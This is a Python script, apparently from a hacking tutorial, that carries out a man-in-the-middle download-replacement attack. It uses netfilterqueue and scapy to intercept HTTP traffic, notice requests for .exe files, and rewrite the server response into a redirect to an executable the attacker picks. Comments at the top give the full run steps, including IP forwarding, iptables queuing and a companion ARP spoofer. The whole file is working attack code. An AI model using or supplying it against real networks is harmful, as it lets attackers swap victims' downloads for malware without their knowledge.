#!/usr/bin/env python

#How to run:
	#0. run		echo 1 > /proc/sys/net/ipv4/ip_forward
	#1. service apache2 start
	#2. iptables -I FORWARD -j NFQUEUE --queue-num 0
	#3. run 	python spoofer.py
	#4. run 	python replace_downloads.py



import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 80:
			if ".exe" in scapy_packet[scapy.Raw].load:
				print("[+] exe Request")
				ack_list.append(scapy_packet[scapy.TCP].ack)
				
		elif scapy_packet[scapy.TCP].sport == 80:
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				print("[+] Replacing file")
				modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar590b3id.exe\n\n")

				packet.set_payload(str(modified_packet))
		
	
	packet.accept() #packet.drop() 



queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

